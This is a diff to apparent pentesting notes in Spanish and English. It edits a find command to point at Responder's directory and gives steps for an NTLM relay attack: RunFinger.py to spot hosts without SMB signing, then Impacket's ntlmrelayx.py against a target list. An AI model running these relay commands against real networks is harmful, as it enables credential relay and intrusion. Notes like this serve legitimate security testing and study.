@@ -2,11 +2,13 @@
 
 comando de Busqueda herramientas:
 ```
-find /var/log/ -name "error.log" -print
+find /usr/share/responder/ -name "error.log" -print
 ```
 
 1. Identify network systems that do not require SMB message validation
-    * Run python  **RunFinger.py -i IP_Range** to detect machine with SMB signing:disabled.
+```
+Run python  **RunFinger.py -i IP_Range** to detect machine with SMB signing:disabled.
+```
     * Configure Impacket’s NTLMrelayx to target those systems
     * **echo "IP"  >> targets.txt**
     * **ntlmrelayx.py -tf targets.txt --smb2support**
